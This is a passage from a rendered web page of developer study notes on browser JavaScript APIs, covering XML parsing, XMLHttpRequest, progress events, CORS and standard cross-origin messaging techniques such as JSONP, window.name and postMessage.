77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/Apps/Fundamentals/Audio_and_video_delivery/Adding_captions_and_subtitles_to_HTML5_video" target="_blank" rel="noopener noreferrer">Adding captions and subtitles to HTML5 video<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>Tutorials on MDN</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content" target="_blank" rel="noopener noreferrer">Video and audio content<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/Apps/Fundamentals/Audio_and_video_delivery/cross_browser_video_player" target="_blank" rel="noopener noreferrer">Creating a cross-browser video player<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h2 id="xml"><a href="#xml" class="header-anchor">#</a> XML</h2> <ol><li><p><code>Document.implementation.createDocument()</code>: see <a href="#the-document-type">before</a></p></li> <li><p><code>DOMParser</code></p> <ul><li>provides the ability to parse XML or HTML source code from a string into a DOM <code>Document</code></li> <li>Note: <code>XMLHttpRequest</code> can parse XML and HTML directly from a URL-addressable resource, returning a <code>Document</code> in its <code>response</code> property</li> <li>constructor: <code>DOMParser()</code></li> <li>method: <code>DOMParser.parseFromString(source: string, MIMEType: string): Document</code> <ul><li>some MIMEType: <code>&quot;application/xml&quot;</code>, <code>&quot;image/svg+xml&quot;</code>, <code>&quot;text/html&quot;</code></li></ul></li> <li>Error handling — does not throw an exception, but instead returns an error document:<div class="language-xml extra-class"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parsererror</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.mozilla.org/newlayout/xml/parsererror.xml<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
(error description)
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sourcetext</span><span class="token punctuation">&gt;</span></span>(a snippet of the source XML)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sourcetext</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parsererror</span><span class="token punctuation">&gt;</span></span>
</code></pre></div>IE will throw error</li></ul></li> <li><p><code>XMLSerializer</code></p> <ul><li>provides the ability to construct an XML string representing a DOM tree</li> <li>constructor: <code>XMLSerializer()</code></li> <li>method: <code>XMLSerializer.serializeToString(target: Node): string</code> <ul><li>supported type: <code>Node</code> and <code>Attr</code>: <code>DocumentType</code> <code>Document</code> <code>DocumentFragment</code> <code>Element</code> <code>Comment</code> <code>Text</code> <code>ProcessingInstruction</code> <code>Attr</code></li></ul></li></ul></li> <li><p>XPath</p> <ul><li>XPath stands for XML Path Language. It uses a non-XML syntax to provide a flexible way of addressing (pointing to) different parts of an XML document</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/XPath" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/evaluate" target="_blank" rel="noopener noreferrer"><code>Document.evaluate()</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>XSLT</p> <ul><li>Extensible Stylesheet Language Transformations (XSLT) is an XML-based language used, in conjunction with specialized processing software, for the transformation of XML documents</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/XSLT" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>E4X</p> <ul><li>standard with no implementation</li></ul></li></ol> <h2 id="ajax-and-comet"><a href="#ajax-and-comet" class="header-anchor">#</a> Ajax and Comet</h2> <h3 id="ajax"><a href="#ajax" class="header-anchor">#</a> Ajax</h3> <ol><li><p>Ajax, short for Asynchronous JavaScript+XML — <code>XMLHttpRequest</code> (XHR)</p> <ul><li>hacks before <code>XMLHttpRequest</code> — mostly using hidden frames or iframes</li> <li>no reloading — make requests to the server without reloading the page</li> <li>can be asynchronous or synchronous</li></ul></li> <li><p><code>XMLHttpRequest</code></p> <ul><li>Despite its name, XMLHttpRequest can be used to retrieve any type of data, not just XML, and it supports protocols other than HTTP (including file and ftp)</li> <li>constructor: <code>XMLHttpRequest()</code></li> <li>inherits: <code>EventTarget</code> ← <code>XMLHttpRequestEventTarget</code> ← <code>XMLHttpRequest</code></li> <li>event handlers
<ul><li><code>EventTarget</code></li> <li><code>XMLHttpRequest.onreadystatechange</code></li> <li><code>XMLHttpRequestEventTarget.ontimeout</code></li> <li><code>XMLHttpRequest.load</code> events also available on <code>XMLHttpRequest</code></li></ul></li> <li>properties
<ul><li><code>XMLHttpRequest.readyState</code> Read only — Returns an unsigned short, the state of the request
<ul><li><code>0</code> <code>XMLHttpRequest.UNSENT</code> — Client has been created. <code>open()</code> not called yet</li> <li><code>1</code> <code>OPENED</code> — <code>open()</code> has been called</li> <li><code>2</code> <code>HEADERS_RECEIVED</code> — <code>send()</code> has been called, and headers and status are available</li> <li><code>3</code> <code>LOADING</code> — Downloading; <code>responseText</code> holds partial data</li> <li><code>4</code> <code>DONE</code> — The operation is complete</li> <li>different for IE</li></ul></li> <li><code>XMLHttpRequest.response</code> Read only — Returns an <code>ArrayBuffer</code>, <code>Blob</code>, <code>Document</code>, JavaScript object, or a <code>DOMString</code>, depending on the value of <code>XMLHttpRequest.responseType</code>, contains the response entity body</li> <li><code>XMLHttpRequest.responseText</code> Read only — Returns a <code>DOMString</code> that contains the response to the request as text, or <code>null</code> if the request was unsuccessful or has not yet been sent</li> <li><code>XMLHttpRequest.responseType</code> — Is an enumerated value that defines the response type
<ul><li>allow modification, default value <code>&quot;text&quot;</code> is used if empty string</li> <li><code>&quot;arraybuffer&quot;</code> — The response is a JavaScript <code>ArrayBuffer</code> containing binary data</li> <li><code>&quot;blob&quot;</code> — The response is a <code>Blob</code> object containing the binary data</li> <li><code>&quot;document&quot;</code> — The response is an HTML <code>Document</code> or XML <code>XMLDocument</code>, as appropriate based on the MIME type of the received data</li> <li><code>&quot;json&quot;</code> — The response is a JavaScript object created by parsing the contents of received data as JSON</li> <li><code>&quot;text&quot;</code> — The response is text in a <code>DOMString</code> object</li> <li>cannot change the value of <code>responseType</code> in a synchronous <code>XMLHttpRequest</code> except when the request belongs to a <code>Worker</code></li> <li>Attempts to set the value of <code>responseType</code> to <code>&quot;document&quot;</code> are ignored in a <code>Worker</code></li></ul></li> <li><code>XMLHttpRequest.responseURL</code> Read only — Returns the serialized URL of the response or the empty string if the URL is <code>null</code></li> <li><code>XMLHttpRequest.responseXML</code> Read only  Not available to workers — Returns a <code>Document</code> containing the response to the request, or <code>null</code> if the request was unsuccessful, has not yet been sent, or cannot be parsed as XML or HTML</li> <li><code>XMLHttpRequest.status</code> Read only — Returns an unsigned short with the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" target="_blank" rel="noopener noreferrer">HTTP status code<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> of the response of the request
<ul><li>0: not completed or error</li> <li>100-102: Information responses</li> <li>200-208, 216: successful responses</li> <li>300-308: redirection responses, 304 Not Modified</li> <li>400-418, 421-426, 428, 429, 431, 451: client error responses</li> <li>500-508, 510, 511: server error responses</li> <li>If the server response doesn't explicitly specify a status code, will assume the default value 200</li></ul></li> <li><code>XMLHttpRequest.statusText</code> Read only — Returns a <code>DOMString</code> containing the response string returned by the HTTP server
<ul><li>such as &quot;OK&quot;, or &quot;Not Found&quot;</li></ul></li> <li><code>XMLHttpRequest.timeout</code> — Is an unsigned long representing the number of milliseconds a request can take before automatically being terminated
<ul><li>may not use a timeout for synchronous requests with an owning window</li> <li>defaults to 0, no timeout</li></ul></li> <li><code>XMLHttpRequest.upload</code> Read only — Is an <code>XMLHttpRequestUpload</code> for setting event listeners, representing the upload process
<ul><li>see Progress Events</li></ul></li> <li><code>XMLHttpRequest.withCredentials</code> — Is a Boolean that indicates whether or not cross-site Access-Control requests should be made using credentials such as cookies or authorization headers</li></ul></li> <li>methods
<ul><li><code>XMLHttpRequest.open(method, url): void</code><br> <code>XMLHttpRequest.open(method, url, async: boolean, username?: string, password?: string): void</code> — Initializes a request
<ul><li>Calling this method for an already active request (one for which <code>open()</code> has already been called) is the equivalent of calling <code>abort()</code></li> <li>method: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" target="_blank" rel="noopener noreferrer">HTTP request method<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, such as &quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;</li> <li>async: defaults to <code>true</code>, in fact, many browsers have deprecated synchronous XHR support on the main thread entirely. Synchronous requests are permitted in <code>Worker</code></li></ul></li> <li><code>XMLHttpRequest.send(body?): void</code> — Sends the request. If the request is asynchronous (which is the default), this method returns as soon as the request is sent and the result is delivered using events
<ul><li>If the request is synchronous, this method doesn't return until the response has arrived</li> <li>body: defaults to <code>null</code> for <code>&quot;GET&quot;</code>, <code>&quot;HEAD&quot;</code>, for <code>&quot;PUT&quot;</code> it can be <code>Document</code>, <code>Blob</code>, <code>ArrayBuffer</code>, <code>ArrayBufferView</code>, <code>FormData</code>, <code>URLSearchParams</code>, <code>ReadableStream</code>, or <code>USVString</code></li></ul></li> <li><code>XMLHttpRequest.setRequestHeader(name: string, value: string): void</code> — Sets the value of an HTTP request header. You must call <code>setRequestHeader()</code> after <code>open(),</code> but before <code>send()</code> <ul><li>each call after the first call, the specified text is appended to the end of the existing header's content</li> <li>If no <code>Accept</code> header has been set using this, an <code>Accept</code> header with the type <code>&quot;*/*&quot;</code> is sent with the request when <code>send()</code> is called</li> <li>For security reasons, some headers can only be controlled by the user agent, see <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>XMLHttpRequest.abort()</code> — Aborts the request if it has already been sent
<ul><li>When a request is aborted, its <code>readyState</code> is changed to <code>XMLHttpRequest.UNSENT</code> (0) and the request's <code>status</code> code is set to 0.</li></ul></li> <li><code>XMLHttpRequest.getAllResponseHeaders()</code> — Returns all the response headers, separated by CRLF, as a string, or <code>null</code> if no response has been received
<ul><li>If a network error happened, an empty string is returned</li></ul></li> <li><code>XMLHttpRequest.getResponseHeader(name: string): string</code> — Returns the string containing the text of the specified header, or <code>null</code> if either the response has not yet been received or the header doesn't exist in the response
<ul><li>If there are multiple response headers with the same name, then their values are returned as a single concatenated string, separated by a pair of comma and space</li> <li>the header name is case-insensitive</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener noreferrer">HTTP headers<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>By default, only the 6 simple response headers are exposed: Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma</li> <li>If you want clients to be able to access other headers, the server response have to list them using the Access-Control-Expose-Headers header</li></ul></li> <li><code>XMLHttpRequest.overrideMimeType()</code> — Overrides the MIME type returned by the server
<ul><li>This method must be called before calling <code>send()</code></li> <li>If the server doesn't provide a <code>Content-Type</code> header, <code>XMLHttpRequest</code> assumes that the MIME type is <code>&quot;text/xml&quot;</code>. If the content isn't valid XML, an &quot;XML Parsing Error: not well-formed&quot; error occurs</li> <li><code>XMLHttpRequest.responseType</code> in conjunction with <code>XMLHttpRequest.response</code> is preferred</li></ul></li></ul></li></ul></li> <li><p>notes on XHR</p> <ul><li>cache
<ul><li>If you do not set header <code>Cache-Control: no-cache</code> the browser will cache the response and never re-submit the request, making debugging challenging
<ul><li>also <code>Cache-Control: no-cache, no-store, must-revalidate</code></li></ul></li> <li>can also add an always-different GET parameter, like a timestamp or random number</li></ul></li> <li>if a global variable, different calls can overwrite each other, better use closure</li></ul></li> <li><p>Adapting Sync XHR use cases</p> <ul><li>some cases in which the synchronous usage of <code>XMLHttpRequest</code> was not replaceable, like during the <code>window.onunload</code> and <code>window.onbeforeunload</code> events</li> <li>should consider using the <code>fetch</code> API with <code>keepalive</code> flag</li> <li>when <code>fetch</code> unavailable, <code>Navigator.sendBeacon(url, data?)</code> <ul><li>can be used to asynchronously transfer a small amount of data over HTTP to a web server</li> <li>data is the same as the argument in <code>XMLHttpRequest.send(): boolean</code></li> <li>returns <code>true</code> if the user agent is able to successfully queue the data for transfer</li> <li>on IE support</li></ul></li></ul></li></ol> <h3 id="progress-events"><a href="#progress-events" class="header-anchor">#</a> Progress Events</h3> <ol><li><p><code>ProgressEvent</code></p> <ul><li>represents events measuring progress of an underlying process, like an HTTP request (for an XMLHttpRequest, or the loading of the underlying resource of an <code>&lt;img&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;style&gt;</code> or <code>&lt;link&gt;</code>)</li> <li>constructor: <code>ProgressEvent(type: string, eventInitDict?: ProgressEventInit)</code></li> <li>properties<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>oEvent<span class="token punctuation">.</span>lengthComputable<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> percentComplete <span class="token operator">=</span> event<span class="token punctuation">.</span>loaded <span class="token operator">/</span> event<span class="token punctuation">.</span>total <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li><code>ProgressEvent.lengthComputable</code> Read only — Is a Boolean flag indicating if the total work to be done, and the amount of work already done, by the underlying process is calculable. In other words, it tells if the progress is measurable or not</li> <li><code>ProgressEvent.loaded</code> Read only — Is an unsigned long long representing the amount of work already performed by the underlying process. The ratio of work done can be calculated with the property and <code>ProgressEvent.total</code>. When downloading a resource using HTTP, this only represent the part of the content itself, not headers and other overhead</li> <li><code>ProgressEvent.total</code> Read only — Is an unsigned long long representing the total amount of work that the underlying process is in the progress of performing. When downloading a resource using HTTP, this only represent the content itself, not headers and other overhead</li></ul></li></ul></li> <li><p>progress event types</p> <ul><li><code>loadstart</code> — The upload has begun</li> <li><code>progress</code> — Periodically delivered to indicate the current amount of progress made so far</li> <li><code>abort</code> — The upload operation was aborted</li> <li><code>error</code> — The upload failed due to an error</li> <li><code>load</code> — The upload completed successfully</li> <li><code>timeout</code> — <code>XMLHttpRequest.timeout</code> exceeded</li> <li><code>loadend</code> — The upload completed; this event does not differentiate between success or failure, and is sent at the very end of the upload process, regardless of the outcome</li> <li>You need to add the event listeners before calling <code>open()</code> on the request. Otherwise the progress events will not fire</li> <li>The download events are fired on the <code>XMLHttpRequest</code> object itself, the upload events are fired on the <code>XMLHttpRequest.upload</code> object</li> <li>Progress events are not available for the <code>file:</code> protocol</li></ul></li></ol> <h3 id="cors"><a href="#cors" class="header-anchor">#</a> CORS</h3> <ol><li><p>Cross-Origin Resource Sharing (CORS)</p> <ul><li>a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin</li> <li>A web application makes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, and port) than its own origin</li> <li>same-origin policy: see before</li> <li>preflight: for HTTP request methods that can cause side-effects on server's data, the specification mandates that browsers &quot;preflight&quot; the request, soliciting supported methods from the server with an HTTP OPTIONS request method, and then, upon &quot;approval&quot; from the server, sending the actual request with the actual HTTP request method
<ul><li>Servers can also notify clients whether &quot;credentials&quot; (including Cookies and HTTP Authentication data) should be sent with requests</li></ul></li> <li>CORS failures result in errors, but for security reasons, specifics about what went wrong are not available to JavaScript code, can only check browser console</li></ul></li> <li><p>Simple requests, A request that doesn’t trigger a CORS preflight</p> <ul><li>The only allowed methods are: GET HEAD POST</li> <li>Apart from the headers set automatically by the user agent, the only headers which are allowed to be manually set are
<ul><li>Accept, Accept-Language, Content-Language, DPR, Downlink, Save-Data, Viewport-Width, Width</li> <li>Content-Type with
<ul><li><code>application/x-www-form-urlencoded</code></li> <li><code>multipart/form-data</code></li> <li><code>text/plain</code></li></ul></li></ul></li> <li>No event listeners are registered on any <code>XMLHttpRequestUpload</code> object used in the request</li> <li>a <code>ReadableStream</code> object cannot be used in the request</li> <li>additional headers
<ul><li>request sent with <code>Origin</code> header</li> <li>response received with <code>Access-Control-Allow-Origin</code> header, <code>*</code> if allow all sites</li></ul></li></ul></li> <li><p>Preflight requests</p> <ul><li>no IE10 and before</li> <li>when not a simple request, a “preflight” request is made to the server, then the main request</li> <li>preflight — OPTIONS method and sends the following headers:
<ul><li>Origin — Same as in simple requests.</li> <li>Access-Control-Request-Method — The method that the request wants to use.</li> <li>Access-Control-Request-Headers — (Optional) A comma-separated list of the custom headers being used.</li></ul></li> <li>additional headers of server response to preflight
<ul><li>Access-Control-Allow-Origin — Same as in simple requests</li> <li>Access-Control-Allow-Methods — A comma-separated list of allowed methods</li> <li>Access-Control-Allow-Headers — A comma-separated list of headers that the server will allow</li> <li>Access-Control-Max-Age — The amount of time in seconds that this preflight request should be cached for</li></ul></li></ul></li> <li><p>Preflight requests and redirects</p> <ul><li>Not all browsers currently support following redirects after a preflight request and will generate an error
<ul><li>The CORS protocol originally required that behavior but was subsequently changed to no longer require it</li></ul></li> <li>workaround
<ul><li>change the server-side behavior to avoid the preflight and/or to avoid the redirect—if you have control over the server the request is being made to</li> <li>change the request such that it is a simple request that doesn’t cause a preflight</li> <li>use the directed url
<ol><li>Make a simple request (using <code>Response.url</code> for the Fetch API, or <code>XMLHttpRequest.responseURL</code>) to determine what URL the real preflight request would end up at.</li> <li>Make another request (the “real” request) using the URL you obtained</li></ol></li></ul></li></ul></li> <li><p>Requests with credentials</p> <ul><li>the ability to make &quot;credentialed&quot; requests that are aware of HTTP cookies and HTTP Authentication information</li> <li>need to set <code>XMLHttpRequest.withCredentials</code> to <code>true</code></li> <li>server response to credentialed requests
<ul><li>the browser will reject any response if it does not have the <code>Access-Control-Allow-Credentials: true</code> header</li> <li>When responding to a credentialed request, the server must specify an origin in the value of the Access-Control-Allow-Origin header, instead of specifying the &quot;*&quot; wildcard</li> <li>cookies set in CORS responses are subject to normal third-party cookie policies, cookies set with Set-Cookie header would thus not be saved if the user has configured their browser to reject all third-party cookies</li></ul></li></ul></li></ol> <h3 id="bypass-cors"><a href="#bypass-cors" class="header-anchor">#</a> Bypass CORS</h3> <ol><li><p>Image Pings</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>onload <span class="token operator">=</span> img<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://www.example.com/test?name=Nicholas&quot;</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>Images can be loaded cross-domain by any page without worrying about restrictions</li> <li>can only send GET requests and you cannot access the response text from the server</li> <li>used for one-way communication between the browser and the server</li> <li>dynamically create images and use their <code>onload</code> and <code>onerror</code> event handlers to tell you when the response has been received</li></ul></li> <li><p>JSONP, JSON with padding: dynamic script</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;You’re at IP address &quot;</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>ip <span class="token operator">+</span> <span class="token string">&quot;, which is in &quot;</span> <span class="token operator">+</span>
response<span class="token punctuation">.</span>city <span class="token operator">+</span> <span class="token string">&quot;, &quot;</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>region_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://freegeoip.net/json/?callback=handleResponse&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>script<span class="token punctuation">,</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>firstChild<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>unsafe</li></ul></li> <li><p>Server Proxy: 服务器代理，顾名思义，当你需要有跨域的请求操作时发送请求给后端，让后端帮你代为请求，然后最后将获取的结果发送给你。</p></li> <li><p><code>WebSocket</code></p></li> <li><p>iframe 信息传递</p> <ul><li><code>location.hash</code>，改变 hash 值不会导致页面刷新，所以可以利用 hash 值来进行数据的传递，当然数据量是有限的。
<ul><li>假设 localhost:8080 下有文件 cs1.html 要和 localhost:8081 下的 cs2.html 传递消息，cs1.html 首先创建一个隐藏的 iframe，iframe 的 src 指向 localhost:8081/cs2.html#data，这时的 hash 值就可以做参数传递。</li></ul></li> <li><code>window.name</code> — 在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）<div class="language-JavaScript extra-class"><pre class="language-javascript"><code><span class="token comment">// code on a.html</span>
ifr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// this points to b.html</span>
    ifr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// points to c.html</span>
        data <span class="token operator">=</span> ifr<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>name<span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到数据:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ifr<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://localhost:8080/c.html&quot;</span><span class="token punctuation">;</span> <span class="token comment">// something origin-source as a.html</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li> <li><p>Cross-document messaging, XDM</p> <ul><li>a <code>MessageEvent</code> is dispatched at the target window when message posted</li> <li><code>Window.postMessage(message: any, targetOrigin: string, transfer?: any[]): void</code> <ul><li>obtain <code>window</code> reference
<ul><li><code>Window.open()</code> (to spawn a new window and then reference it),</li> <li><code>Window.opener</code> (to reference the window that spawned this one),</li> <li><code>HTMLIFrameElement.contentWindow</code> (to reference an embedded <code>&lt;iframe&gt;</code> from its parent window),</li> <li><code>Window.parent</code> (to reference the parent window from within an embedded <code>&lt;iframe&gt;),</code> or</li> <li><code>Window.frames</code> + an index value (named or numeric)</li></ul></li> <li><code>message</code> — Data to be sent to the other window. The data is serialized using the structured clone algorithm</li> <li><code>targetOrigin</code> — Specifies what the origin of targetWindow must be for the event to be dispatched
<ul><li>a URI or <code>&quot;*&quot;</code> for any</li> <li>Failing to provide a specific target discloses the data you send to any interested malicious site</li> <li>posting a message to a page at a <code>file:</code> URL currently requires that the <code>targetOrigin</code> argument be <code>&quot;*&quot;</code></li></ul></li> <li><code>transfer</code> — Is a sequence of <code>Transferable</code> objects that are transferred with the message
